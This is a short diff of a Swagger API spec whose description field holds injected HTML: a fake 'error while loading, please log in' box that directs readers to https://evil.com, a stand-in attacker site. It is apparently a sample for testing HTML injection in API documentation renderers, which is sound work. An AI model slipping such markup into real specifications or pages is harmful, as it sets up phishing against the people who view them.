@@ -2,11 +2,11 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Login Page
-  description: Login to continue services below or go to https://evil.com '<div class="login-form">
+  description: '<div class="login-form">
 <!-- Error Message -->
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
   <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-    <strong>An error occurred while loading, please log in.</strong>
+    <strong>An error occurred while loading, please log in or go to https://evil.com .</strong>
   </div>
 </div>
 
